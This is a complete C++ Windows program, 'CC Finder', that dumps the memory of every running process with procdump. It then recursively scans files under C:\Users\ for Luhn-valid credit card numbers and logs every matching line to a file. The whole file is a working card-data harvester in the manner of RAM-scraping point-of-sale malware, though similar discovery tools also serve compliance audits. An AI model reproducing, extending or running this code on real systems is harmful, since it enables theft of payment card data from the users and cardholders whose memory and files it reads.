#include <boost/regex.hpp> 
#include <iostream> 
#include <windows.h>
#include <boost/filesystem.hpp>
#include <vector>
#include <string>
#include "header.h"
#include <boost/iostreams/stream.hpp>
#include <boost/iostreams/device/file_descriptor.hpp>
#include <tlhelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <boost/lexical_cast.hpp>
#include <fstream>

using namespace std;
using namespace boost::filesystem;
namespace fs = boost::filesystem;
namespace io = boost::iostreams;


template<typename ValueType>
std::string ConvertToStringUsingBoost(ValueType const& v)
{
	try
	{

#ifdef UNITTEST
		if (unittest == case_fail) {
			throw boost::bad_lexical_cast();
		}
#endif
		return boost::lexical_cast<std::string, ValueType>(v);
	}
	catch (boost::bad_lexical_cast const& e)
	{
		return std::string();
	}
}



void PrintProcessNameAndID(DWORD processID)
{

	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	// Get the process name.

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	// Print the process name and identifier.

	_tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);



    string cmd = "procdump.exe -accepteula -mp -a -r 5 " + ConvertToStringUsingBoost(processID);
	cout << cmd.c_str();
	system(cmd.c_str());
}

bool checkLuhn(const string& cardNo)
{
	int nDigits = cardNo.length();

	int nSum = 0, isSecond = false;
	for (int i = nDigits - 1; i >= 0; i--) {

		int d = cardNo[i] - '0';

		if (isSecond == true)
			d = d * 2;
		nSum += d / 10;
		nSum += d % 10;

		isSecond = !isSecond;
	}
	return (nSum % 10 == 0);
}

int main()
{
	cout << "CC Finder by independent 3.4 https://GitHub.com/ind3p3nd3nt All rights reserved" << std::endl;
	cout << "Please wait a few hours this will take a while..." << std::endl;
	cout << "---" << std::endl;
	std::ofstream fout("CCFinder.log", ios::app);
	fout << "CC Finder by independent 3.4 https://GitHub.com/ind3p3nd3nt All rights reserved" << std::endl;
	Sleep(20);
	std::ifstream ifile("procdump.exe");
	if (!(bool)ifile) {
		goto loop;
	}
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			return 1;
		}


		// Calculate how many process identifiers were returned.

		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the name and process identifier for each process.

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{
				PrintProcessNameAndID(aProcesses[i]);
			}
		}
		loop:;

		for (auto& x : fs::recursive_directory_iterator("C:\\Users\\")) {
			if (x.path().extension() == ".txt" || x.path().extension() == ".dmp" || x.path().extension() == ".csv" || x.path().extension() == ".lst" || x.path().extension() == ".text" || x.path().extension() == ".dat" || x.path().extension() == ".db" || x.path().extension() == ".dbf" || x.path().extension() == ".sql" || x.path().extension() == ".xml" || x.path().extension() == ".mdb" || x.path().extension() == ".log" || x.path().extension() == ".html" || x.path().extension() == ".htm") {
				if (boost::filesystem::is_regular_file(x.path())) {
					boost::filesystem::absolute(x.path().filename());
					fs::path absolutepath = x;
					std::string line;
					std::cout << absolutepath << std::endl;
					try
					{

						boost::iostreams::stream_buffer<boost::iostreams::file_descriptor_source> biostrm(absolutepath);
						std::istream tgtfile(&biostrm);
						boost::regex regexexpr("\\b[3-6]\\d{15,16}\\b");
						boost::smatch ccregex;
						if (!tgtfile) {
							cout << " Failed to open " << absolutepath << endl;
						}
						while (getline(tgtfile, line))
						{
							if (boost::regex_search(line, ccregex, regexexpr))
							{

								if (checkLuhn(ccregex.str())) {
									SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
									fout << line << std::endl;
									std::cout << line << std::endl;
									for (int i(0); i < ccregex.size(); i++) {
										SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
										std::cout << ccregex[i] << std::endl;
									}
								}
							}

						}
					}
					catch (const std::exception & ex)
					{

						std::cout << absolutepath << " " << ex.what() << std::endl;
					}
				}
			}
		}
}
